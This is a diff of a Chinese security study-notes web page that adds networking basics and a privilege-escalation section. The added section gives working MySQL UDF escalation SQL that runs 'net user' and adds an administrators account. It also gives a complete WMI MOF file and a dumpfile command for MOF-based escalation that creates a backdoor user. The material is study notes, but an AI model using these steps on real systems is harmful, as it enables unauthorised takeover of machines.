@@ -298,13 +298,26 @@
 </li>
 </ul>
 <p>​                </p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="TCP三次握手的过程以及对应的状态转换"><a href="#TCP三次握手的过程以及对应的状态转换" class="headerlink" title="TCP三次握手的过程以及对应的状态转换"></a>TCP三次握手的过程以及对应的状态转换</h3><p>（1）客户端向服务器端发送一个SYN包，包含客户端使用的端口号和初始序列号x;<br>（2）服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号xx1和服务器端的初始序列号y;<br>（3）客户端收到服务器端返回的SYNSACK报文后，向服务器端返回一个确认号为yy1、序号为xx1的ACK报文，一个标准的TCP连接完成。</p>
 <p><strong>三次握手</strong></p>
 <ul>
-<li>​        <strong>发送端发送带有syn标志的数据包给接收端，这是第一次握手。</strong>       </li>
-<li>​        <strong>接收端回传一个带有syn/ack标志的数据包给发送端以表示传达确认信息，这是第二次握手。</strong></li>
-<li>​        <strong>发送端回传一个带有ack标志的数据包，这是第三次握手，代表握手结束。</strong></li>
+<li><p>​        <strong>发送端发送带有syn标志的数据包给接收端，这是第一次握手。</strong>       </p>
+</li>
+<li><p>​        <strong>接收端回传一个带有syn/ack标志的数据包给发送端以表示传达确认信息，这是第二次握手。</strong></p>
+</li>
+<li><p>​        <strong>发送端回传一个带有ack标志的数据包，这是第三次握手，代表握手结束。</strong></p>
+</li>
 </ul>
-<hr>
+<h3 id="TCP和UDP协议区别"><a href="#TCP和UDP协议区别" class="headerlink" title="TCP和UDP协议区别"></a>TCP和UDP协议区别</h3><p>tcp面向连接,udp面向报文 tcp对系统资源的要求多 udp结构简单 tcp保证数据完整性和顺序，udp不保证</p>
+<h3 id="https的建立过程"><a href="#https的建立过程" class="headerlink" title="https的建立过程"></a>https的建立过程</h3><ul>
+<li>客户端发送请求到服务器端</li>
+<li>服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在</li>
+<li>客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端</li>
+<li>服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端</li>
+<li>客户端使用共享密钥解密数据</li>
+<li>SSL加密建立</li>
+</ul>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><hr>
 <h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><h4 id="Get和Post方法的区别"><a href="#Get和Post方法的区别" class="headerlink" title="Get和Post方法的区别"></a>Get和Post方法的区别</h4><p><strong>Http</strong>协议定义了很多与服务器交互的方法，最基本的有4种，分别是<strong>GET,POST,PUT,DELETE；</strong>还有<strong>OPTIONS</strong>方法，可以查询开启哪些与服务器交互的方法。 一个<strong>URL</strong>地址用于描述一个网络上的资源，而<strong>HTTP</strong>中的<strong>GET, POST, PUT, DELETE</strong>就对应着对这个资源的<strong>查，改，增，删4</strong>个操作。 我们最常见的就是<strong>GET</strong>和<strong>POST</strong>了。<strong>GET</strong>一般用于获取/查询资源信息，而<strong>POST</strong>一般用于更新资源信息.</p>
 <p>我们看看<strong>GET</strong>和<strong>POST</strong>的区别</p>
 <ol>
@@ -321,10 +334,10 @@
 <h3 id="LINUX系统"><a href="#LINUX系统" class="headerlink" title="LINUX系统"></a>LINUX系统</h3><h4 id="Linux用户类型"><a href="#Linux用户类型" class="headerlink" title="Linux用户类型"></a>Linux用户类型</h4><p><strong>Linux</strong>用户类型分为三类：超级用户、系统用户和普通用户<strong>**<br>**超级用户</strong>：用户名为<strong>root</strong>或<strong>USER ID（UID）</strong>为<strong>0</strong>的账号，具有一切权限，可以操作系统中的所有资源。<strong>Root</strong>用户可以进行基础的文件操作及特殊的系统管理，可以修改系统中的任何文件。<br>系统用户：正常运行系统时使用的账户。每个进程运行在系统里都有一个相应的属主，比如某个进程以何种身份运行，这些身份就是系统里对应的用户账号。<br>普通用户：普通使用者能使用<strong>Linux</strong>的大部分资源，一些特定的权限受到控制。用户只对自己的目录有写权限，读写权限受一定的限制，有效保证了系统安全性。</p>
 <h4 id="Linux文件类型"><a href="#Linux文件类型" class="headerlink" title="Linux文件类型"></a>Linux文件类型</h4><p><strong>Linux</strong>有<strong>4</strong>种基本文件系统类型：普通文件、目录文件、链接文件和特殊文件。通过<strong>ls-l</strong>命令可以返回文件的相关属性，其中第一个字符就是用于标识文件的类型。<br>普通文件包括文本文件、程序代码文件、<strong>Shell</strong>脚本、二进制的可执行文件等，系统中的绝大部分文件都属于这种类型。<br>目录是被作为一个文件来对待，其标识值为<strong>d</strong>。目录下可以包括文件和子目录。</p>
 <p>链接文件其实是一个指向文件的指针，通过链接文件，用户访问的将会是指针所指向的文件。</p>
-<h4 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h4><h5 id="last"><a href="#last" class="headerlink" title="last"></a>last</h5><p><strong>last</strong>命令用于显示用户最近登录信息。单独执行<strong>last</strong>命令，它会读取<strong>/var/log/wtmp</strong>的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来。</p>
-<h5 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h5><p><strong>lastb</strong>命令用于显示用户错误的登录列表，此指令可以发现系统的登录异常。单独执行<strong>lastb</strong>命令，它会读取位于<strong>/var/log</strong>目录下，名称为<strong>btmp</strong>的文件，并把该文件内容记录的登入失败的用户名单，全部显示出来。</p>
-<h5 id="lastlog"><a href="#lastlog" class="headerlink" title="lastlog"></a>lastlog</h5><p><strong>lastlog</strong>命令用于显示系统中所有用户最近一次登录信息。</p>
-<p><strong>lastlog</strong>文件在每次有用户登录时被查询。可以使用<strong>lastlog</strong>命令检查某特定用户上次登录的时间，并格式化输出上次登录日志<strong>/var/log/lastlog</strong>的内容。它根据<strong>UID</strong>排序显示登录名、端口号<strong>（tty）</strong>和上次登录时间。如果一个用户从未登录过，<strong>lastlog</strong>显示<strong>Never logged</strong>。注意需要以<strong>root</strong>身份运行该命令。</p>
+<h4 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h4><h5 id="last"><a href="#last" class="headerlink" title="last"></a>last</h5><p><strong>last</strong>   命令用于显示用户最近登录信息。单独执行<strong>last</strong>命令，它会读取<strong>/var/log/wtmp</strong>的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来。</p>
+<h5 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h5><p><strong>lastb</strong> 命令用于显示用户错误的登录列表，此指令可以发现系统的登录异常。单独执行<strong>lastb</strong>命令，它会读取位于<strong>/var/log</strong>目录下，名称为<strong>btmp</strong>的文件，并把该文件内容记录的登入失败的用户名单，全部显示出来。</p>
+<h5 id="lastlog"><a href="#lastlog" class="headerlink" title="lastlog"></a>lastlog</h5><p><strong>lastlog</strong> 命令用于显示系统中所有用户最近一次登录信息。</p>
+<p><strong>lastlog **文件在每次有用户登录时被查询。可以使用</strong>lastlog<strong>命令检查某特定用户上次登录的时间，并格式化输出上次登录日志</strong>/var/log/lastlog<strong>的内容。它根据</strong>UID<strong>排序显示登录名、端口号</strong>（tty）<strong>和上次登录时间。如果一个用户从未登录过，</strong>lastlog<strong>显示</strong>Never logged<strong>。注意需要以</strong>root**身份运行该命令。</p>
 <hr>
 <h3 id="Windows命令"><a href="#Windows命令" class="headerlink" title="Windows命令"></a>Windows命令</h3><h4 id="eventvwr-msc"><a href="#eventvwr-msc" class="headerlink" title="eventvwr.msc"></a>eventvwr.msc</h4><p><strong>eventvwr.msc</strong>命令用于打开事件管理器</p>
 <h4 id="gpedit-msc"><a href="#gpedit-msc" class="headerlink" title="gpedit.msc"></a>gpedit.msc</h4><p><strong>gpedit.msc</strong>命令用于打开本地组策略器</p>
@@ -403,6 +416,10 @@
 <h4 id="MySQL常用的系统函数"><a href="#MySQL常用的系统函数" class="headerlink" title="MySQL常用的系统函数"></a><strong>MySQL常用的系统函数</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">version()            <span class="comment">#MySQL版本</span></span><br><span class="line">user()               <span class="comment">#数据库用户名</span></span><br><span class="line">database()           <span class="comment">#数据库名</span></span><br><span class="line">@@datadir            <span class="comment">#数据库路径</span></span><br><span class="line">@@version_compile_os <span class="comment">#操作系统版本</span></span><br></pre></td></tr></table></figure>
 
 <hr>
+<h4 id="Mysql一个-和两个-什么区别"><a href="#Mysql一个-和两个-什么区别" class="headerlink" title="Mysql一个@和两个@什么区别"></a>Mysql一个@和两个@什么区别</h4><ul>
+<li>@为用户变量，使用<code>SET @var1=1</code>赋值</li>
+<li>@@ 为系统变量 ，包括全局变量<code>show global variables \G;</code>和会话变量<code>show session variables \G;</code></li>
+</ul>
 <h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p><strong>XSS是跨站脚本攻击</strong>，用户提交的数据中可以构造恶意<strong>JavaScript</strong>代码来执行，从而实现窃取用户信息等攻击。</p>
 <h4 id="XSS防护方法"><a href="#XSS防护方法" class="headerlink" title="XSS防护方法"></a><strong>XSS防护方法</strong></h4><p>1、对字符实体进行转义</p>
 <p>2、使用<strong>HTTP Only</strong>来禁止<strong>JavaScript</strong>读取<strong>Cookie</strong>值</p>
@@ -433,6 +450,22 @@
 <p><strong>XXE</strong>全称是——<strong>XML External Entity</strong>,也就是<strong>XML</strong>外部实体注入攻击，漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p>
 <p><strong>XXE</strong>是<strong>XML</strong>外部实体注入攻击，<strong>XML</strong>中可以通过调用外部实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取、内部文件共享、内部端口扫描、远程代码执行以及拒绝服务攻击。</p>
 <h4 id="XXE防护方法"><a href="#XXE防护方法" class="headerlink" title="XXE防护方法"></a><strong>XXE防护方法</strong></h4><p><strong>XML</strong>解析库在调用时严格禁止对外部实体的解析</p>
+<hr>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h4><h5 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h5><p>udf是用户自定义函数，是mysql数据库功能的一种扩展，利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
+<p>要求: 1.目标系统是Windows(Win2000,XP,Win2003)； 2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数 3.有root账号密码 导出udf: MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数 可以再mysql里输入 <code>select @@basedir</code> <code>show variables like ‘%plugins%’</code> 寻找mysql安装路径 提权:</p>
+<p>使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname ‘udf.dll’</span><br><span class="line">select cmdshell(‘net user arsch arsch &#x2F;add’);</span><br><span class="line">select cmdshell(‘net localgroup administrators arsch &#x2F;add’);</span><br><span class="line"></span><br><span class="line">drop function cmdshell;</span><br></pre></td></tr></table></figure>
+
+<p>该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。</p>
+<h5 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h5><p>MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name  &#x3D; &quot;filtP2&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D;</span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user test test  &#x2F;add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer   &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、执行load_file及into dumpfile把文件导出到正确的位置即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load file(&#39;c:&#x2F;wmpub&#x2F;nullevt.mof&#39;) into dumpfile &#39;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mov&#39;</span><br></pre></td></tr></table></figure>
+
+<p>执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。</p>
 <hr>
 <h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a><strong>代码执行</strong></h3><h4 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a><strong>代码执行函数</strong></h4><p><strong>eval 、preg_replace+/e 、assert、call_user_func、call_user_func_array、 create_function</strong></p>
 <hr>
